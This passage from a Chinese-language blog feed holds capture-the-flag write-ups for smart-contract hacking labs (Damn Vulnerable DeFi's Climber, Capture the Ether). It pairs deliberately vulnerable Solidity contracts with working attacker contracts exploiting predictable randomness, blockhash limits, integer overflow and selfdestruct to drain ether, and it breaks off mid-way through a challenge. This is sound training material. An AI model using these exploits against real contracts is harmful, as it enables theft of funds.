class="hljs-keyword">await</span> ethers.getContractFactory(<span class="hljs-string">&#x27;ClimberVaultV2&#x27;</span>,attacker);<br>    <span class="hljs-keyword">const</span> attacker_vault = <span class="hljs-keyword">await</span> upgrades.upgradeProxy(<span class="hljs-built_in">this</span>.vault.address, vaultV2);<br>    <span class="hljs-comment">//耗尽所有代币</span><br>    <span class="hljs-keyword">await</span> attacker_vault.connect(attacker).sweepFundsV2(<span class="hljs-built_in">this</span>.token.address);<br>&#125;);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>靶场刷题</tag>
      
      <tag>Etherum</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup | capture the ether</title>
    <link href="/2022/04/02/capture%20the%20ether%20wp/"/>
    <url>/2022/04/02/capture%20the%20ether%20wp/</url>
    
    <content type="html"><![CDATA[<p><a href="https://capturetheether.com/">靶场地址</a></p><h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><h3 id="Deploy-a-contract"><a href="#Deploy-a-contract" class="headerlink" title="Deploy a contract"></a>Deploy a contract</h3><p>连接 MetaMask 即可</p><h3 id="Call-me"><a href="#Call-me" class="headerlink" title="Call me"></a>Call me</h3><p>要求调用callme函数</p><p>在remix的deploy处将我们挑战的页面里给出的合约地址填上，部署后调用即可</p><p><img src="/2022/04/02/capture%20the%20ether%20wp/image-20220321205348097.png" alt="image-20220321205348097"></p><h3 id="Choose-a-nickname"><a href="#Choose-a-nickname" class="headerlink" title="Choose a nickname"></a>Choose a nickname</h3><p>设置自己的昵称</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>// Relevant part of the CaptureTheEther contract.<br>contract CaptureTheEther &#123;<br>    mapping (address =&gt; bytes32) public nicknameOf;<br><br>    function setNickname(bytes32 nickname) public &#123;<br>        nicknameOf[msg.sender] = nickname;<br>    &#125;<br>&#125;<br><br>// Challenge contract. You don&#x27;t need to do anything with this; it just verifies<br>// that you set a nickname for yourself.<br>contract NicknameChallenge &#123;<br>    CaptureTheEther cte = CaptureTheEther(msg.sender);<br>    address player;<br><br>    // Your address gets passed in as a constructor parameter.<br>    function NicknameChallenge(address _player) public &#123;<br>        player = _player;<br>    &#125;<br><br>    // Check that the first character is not null.<br>    function isComplete() public view returns (bool) &#123;<br>        return cte.nicknameOf(player)[0] != 0;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>同样的在remix里操作即可</p><p>注意要将昵称转化为十六进制，并且 <code>return cte.nicknameOf(player)[0] != 0;</code></p><h2 id="Lotteries"><a href="#Lotteries" class="headerlink" title="Lotteries"></a>Lotteries</h2><h3 id="Guess-the-number"><a href="#Guess-the-number" class="headerlink" title="Guess the number"></a>Guess the number</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract GuessTheNumberChallenge &#123;<br>    uint8 answer = 42;<br><br>    function GuessTheNumberChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function guess(uint8 n) public payable &#123;<br>        require(msg.value == 1 ether);<br><br>        if (n == answer) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>已知 <code>answer = 42</code></p><p>注意调用guess函数并传参42的同时发送1 ether</p><h3 id="Guess-the-secret-number"><a href="#Guess-the-secret-number" class="headerlink" title="Guess the secret number"></a>Guess the secret number</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract GuessTheSecretNumberChallenge &#123;<br>    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;<br><br>    function GuessTheSecretNumberChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br>    <br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function guess(uint8 n) public payable &#123;<br>        require(msg.value == 1 ether);<br><br>        if (keccak256(n) == answerHash) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以计算答案</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.18;<br>contract guess &#123;<br>    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;<br>    uint8 public answer = 0;<br>    <br>    function guessanswer() returns (uint8) &#123;<br>        for(uint8 i = 0;i &lt;= 256;i ++)&#123;<br>            if(keccak256(i) == answerHash)&#123;<br>                answer = i;<br>                return answer;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Guess-the-random-number"><a href="#Guess-the-random-number" class="headerlink" title="Guess the random number"></a>Guess the random number</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract GuessTheRandomNumberChallenge &#123;<br>    uint8 answer;<br><br>    function GuessTheRandomNumberChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>        answer = uint8(keccak256(block.blockhash(block.number - 1), now));<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function guess(uint8 n) public payable &#123;<br>        require(msg.value == 1 ether);<br><br>        if (n == answer) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以去<a href="https://ropsten.etherscan.io/tx/0x156434f91ee12e3c759449de619ba2cb2b4f21f17f89e64eca87b181b8728e83#statechange">交易详情</a>查看</p><p><img src="/2022/04/02/capture%20the%20ether%20wp/image-20220322223448498.png" alt="image-20220322223448498"></p><p>即77</p><h3 id="Guess-the-new-number"><a href="#Guess-the-new-number" class="headerlink" title="Guess the new number"></a>Guess the new number</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract GuessTheNewNumberChallenge &#123;<br>    function GuessTheNewNumberChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function guess(uint8 n) public payable &#123;<br>        require(msg.value == 1 ether);<br>        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));<br><br>        if (n == answer) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>写一个 <code>constructor()</code> ，部署时打入1ETH</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract attacker &#123;<br>    constructor() public payable &#123;<br>        <br>    &#125; <br>    function attack() public payable &#123;<br>        uint8 result = uint8(keccak256(block.blockhash(block.number - 1), now));<br>        GuessTheNewNumberChallenge target = GuessTheNewNumberChallenge(0x311e6C0Ae5476ad374c0e7A9B4582ac1eB42b213);<br>        target.guess.value(1 ether)(result);<br>    &#125;<br><br>    function() public payable &#123;<br><br>    &#125;<br><br>    function destroy() public payable &#123;<br>        selfdestruct(msg.sender);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Predict-the-future"><a href="#Predict-the-future" class="headerlink" title="Predict the future"></a>Predict the future</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract PredictTheFutureChallenge &#123;<br>    address guesser;<br>    uint8 guess;<br>    uint256 settlementBlockNumber;<br><br>    function PredictTheFutureChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function lockInGuess(uint8 n) public payable &#123;<br>        require(guesser == 0);<br>        require(msg.value == 1 ether);<br><br>        guesser = msg.sender;<br>        guess = n;<br>        settlementBlockNumber = block.number + 1;<br>    &#125;<br><br>    function settle() public &#123;<br>        require(msg.sender == guesser);<br>        require(block.number &gt; settlementBlockNumber);<br><br>        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;<br><br>        guesser = 0;<br>        if (guess == answer) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>让answer来就我们，按照规则一次一次地尝试生成answer，当此块的信息得到的answer与我们猜的guess相同时我们再调用settle函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract attacker &#123;<br>    PredictTheFutureChallenge target;<br>    uint8 result;<br>    constructor() public payable &#123;<br>        target = PredictTheFutureChallenge(0xf6C4f214fDF6B367255281c0cF65653B0820F1F9);<br>    &#125;<br><br>    function attack() payable&#123;<br>        target.lockInGuess.value(1 ether)(3);<br>    &#125;<br><br>    function exploit() &#123;<br>        result = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;<br>        if(result == 3)&#123;<br>            target.settle();<br>        &#125;<br>    &#125;<br><br>    function see() view returns (uint8) &#123;<br>        return result;<br>    &#125;<br><br>    function destroy() payable &#123;<br>        selfdestruct(msg.sender);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Predict-the-block-hash"><a href="#Predict-the-block-hash" class="headerlink" title="Predict the block hash"></a>Predict the block hash</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract PredictTheBlockHashChallenge &#123;<br>    address guesser;<br>    bytes32 guess;<br>    uint256 settlementBlockNumber;<br><br>    function PredictTheBlockHashChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function lockInGuess(bytes32 hash) public payable &#123;<br>        require(guesser == 0);<br>        require(msg.value == 1 ether);<br><br>        guesser = msg.sender;<br>        guess = hash;<br>        settlementBlockNumber = block.number + 1;<br>    &#125;<br><br>    function settle() public &#123;<br>        require(msg.sender == guesser);<br>        require(block.number &gt; settlementBlockNumber);<br><br>        bytes32 answer = block.blockhash(settlementBlockNumber);<br><br>        guesser = 0;<br>        if (guess == answer) &#123;<br>            msg.sender.transfer(2 ether);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/04/02/capture%20the%20ether%20wp/Screenshot+2019-11-20+08.20.54.png" alt="Screenshot 2019-11-20 08.20.54.png"></p><p>我们看到该函数仅适用于最近的 256 个块。如果您尝试调用发生在 300 块前的函数，它会返回零。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract attacker &#123;<br>    PredictTheBlockHashChallenge target = PredictTheBlockHashChallenge(0xB562947997118272df148A0c5d8Ca1d6aEb4948F);<br>    uint256 settlementBlockNumber;<br><br>    constructor() payable &#123;<br><br>    &#125;<br><br>    function attack() payable &#123;<br>        settlementBlockNumber = block.number + 1;<br>        target.lockInGuess.value(1 ether)(0x0000000000000000000000000000000000000000000000000000000000000000);<br>    &#125;<br><br>    function exploit() &#123;<br>        require(block.number-settlementBlockNumber&gt;=256);<br>        target.settle();<br>    &#125;<br><br>    function destroy() payable &#123;<br>        selfdestruct(msg.sender);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h2><h3 id="Token-sale"><a href="#Token-sale" class="headerlink" title="Token sale"></a>Token sale</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract TokenSaleChallenge &#123;<br>    mapping(address =&gt; uint256) public balanceOf;<br>    uint256 constant PRICE_PER_TOKEN = 1 ether;<br><br>    function TokenSaleChallenge(address _player) public payable &#123;<br>        require(msg.value == 1 ether);<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance &lt; 1 ether;<br>    &#125;<br><br>    function buy(uint256 numTokens) public payable &#123;<br>        require(msg.value == numTokens * PRICE_PER_TOKEN);<br><br>        balanceOf[msg.sender] += numTokens;<br>    &#125;<br><br>    function sell(uint256 numTokens) public &#123;<br>        require(balanceOf[msg.sender] &gt;= numTokens);<br><br>        balanceOf[msg.sender] -= numTokens;<br>        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>require(msg.value == numTokens * PRICE_PER_TOKEN);</code> 存在整数乘法上溢</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span> ether = <span class="hljs-number">10</span>^<span class="hljs-number">18</span> wei<br><span class="hljs-regexp">//</span>最大的uint256 = = <span class="hljs-number">115792089237316195423570985008687907853269984665640564039457584007913129639936</span><br>numTokens = <span class="hljs-number">2</span>**<span class="hljs-number">256</span> / <span class="hljs-number">10</span>**<span class="hljs-number">18</span> + <span class="hljs-number">1</span> = <span class="hljs-number">115792089237316195423570985008687907853269984665640564039458</span><br><span class="hljs-regexp">//</span><br>value = numTokens*<span class="hljs-number">10</span>**<span class="hljs-number">18</span>-<span class="hljs-number">2</span>**<span class="hljs-number">256</span> = <span class="hljs-number">415992086870360064</span><br></code></pre></td></tr></table></figure><p>value为 0.415992086870360064 ether，要求 msg.value == numTokens * PRICE_PER_TOKEN 可以被满足。</p><p>然后我们可以 <code>sell()</code> 1 ether，合约余额现在为 0.41ether</p><h3 id="Token-whale"><a href="#Token-whale" class="headerlink" title="Token whale"></a>Token whale</h3><p>Find a way to accumulate at least 1,000,000 tokens to solve this challenge.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract TokenWhaleChallenge &#123;<br>    address player;<br><br>    uint256 public totalSupply;<br>    mapping(address =&gt; uint256) public balanceOf;<br>    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;<br><br>    string public name = &quot;Simple ERC20 Token&quot;;<br>    string public symbol = &quot;SET&quot;;<br>    uint8 public decimals = 18;<br><br>    function TokenWhaleChallenge(address _player) public &#123;<br>        player = _player;<br>        totalSupply = 1000;<br>        balanceOf[player] = 1000;<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return balanceOf[player] &gt;= 1000000;<br>    &#125;<br><br>    event Transfer(address indexed from, address indexed to, uint256 value);<br><br>    function _transfer(address to, uint256 value) internal &#123;<br>        balanceOf[msg.sender] -= value;<br>        balanceOf[to] += value;<br><br>        emit Transfer(msg.sender, to, value);<br>    &#125;<br><br>    function transfer(address to, uint256 value) public &#123;<br>        require(balanceOf[msg.sender] &gt;= value);<br>        require(balanceOf[to] + value &gt;= balanceOf[to]);<br><br>        _transfer(to, value);<br>    &#125;<br><br>    event Approval(address indexed owner, address indexed spender, uint256 value);<br><br>    function approve(address spender, uint256 value) public &#123;<br>        allowance[msg.sender][spender] = value;<br>        emit Approval(msg.sender, spender, value);<br>    &#125;<br><br>    function transferFrom(address from, address to, uint256 value) public &#123;<br>        require(balanceOf[from] &gt;= value);<br>        require(balanceOf[to] + value &gt;= balanceOf[to]);<br>        require(allowance[from][msg.sender] &gt;= value);<br><br>        allowance[from][msg.sender] -= value;<br>        _transfer(to, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>_transfer函数存在溢出</p><ol><li>account1 transfer(account2,1000)</li><li>account2 approve(account1,1000)</li><li>account1 transferFrom(account2,account3,1000)</li></ol><p>由于此时account1的代币余额为0，所以最后调用 <code>_transfer</code> 时会发生下溢</p><h3 id="Retirement-fund"><a href="#Retirement-fund" class="headerlink" title="Retirement fund"></a>Retirement fund</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract RetirementFundChallenge &#123;<br>    uint256 startBalance;<br>    address owner = msg.sender;<br>    address beneficiary;<br>    uint256 expiration = now + 10 years;<br><br>    function RetirementFundChallenge(address player) public payable &#123;<br>        require(msg.value == 1 ether);<br><br>        beneficiary = player;<br>        startBalance = msg.value;<br>    &#125;<br><br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function withdraw() public &#123;<br>        require(msg.sender == owner);<br><br>        if (now &lt; expiration) &#123;<br>            // early withdrawal incurs a 10% penalty<br>            msg.sender.transfer(address(this).balance * 9 / 10);<br>        &#125; else &#123;<br>            msg.sender.transfer(address(this).balance);<br>        &#125;<br>    &#125;<br><br>    function collectPenalty() public &#123;<br>        require(msg.sender == beneficiary);<br><br>        uint256 withdrawn = startBalance - address(this).balance;<br><br>        // an early withdrawal occurred<br>        require(withdrawn &gt; 0);<br><br>        // penalty is what&#x27;s left<br>        msg.sender.transfer(address(this).balance);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用selfdestruct函数，使 <code>collectPenalty()</code> 中的 <code>require(withdrawn &gt; 0);</code> 被满足</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.18;<br>contract attacker &#123;<br>    constructor() payable &#123;<br><br>    &#125;<br><br>    function attack() payable &#123;<br>        selfdestruct(0xde595FF7D9DED625Db68A569BbA0b708e69d025a);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Mapping"><a href="#Mapping" class="headerlink" title="Mapping"></a>Mapping</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract MappingChallenge &#123;<br>    bool public isComplete;<br>    uint256[] map;<br><br>    function set(uint256 key, uint256 value) public &#123;<br>        // Expand dynamic array as needed<br>        if (map.length &lt;= key) &#123;<br>            map.length = key + 1;<br>        &#125;<br><br>        map[key] = value;<br>    &#125;<br><br>    function get(uint256 key) public view returns (uint256) &#123;<br>        return map[key];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>类似<a href="https://ethernaut.zeppelin.solutions/">Ethernaut</a>中的Alien Codex</p><p>数组长度越界，计算相对位置覆盖isComplete</p><h3 id="Donation"><a href="#Donation" class="headerlink" title="Donation"></a>Donation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.21;<br><br>contract DonationChallenge &#123;<br>    struct Donation &#123;<br>        uint256 timestamp;<br>        uint256 etherAmount;<br>    &#125;<br>    Donation[] public donations;<br><br>    address public owner;<br><br>    function DonationChallenge() public payable &#123;<br>        require(msg.value == 1 ether);<br>        <br>        owner = msg.sender;<br>    &#125;<br>    <br>    function isComplete() public view returns (bool) &#123;<br>        return address(this).balance == 0;<br>    &#125;<br><br>    function donate(uint256 etherAmount) public payable &#123;<br>        // amount is in ether, but msg.value is in wei<br>        uint256 scale = 10**18 * 1 ether;<br>        require(msg.value == etherAmount / scale);<br><br>        Donation donation;<br>        donation.timestamp = now;<br>        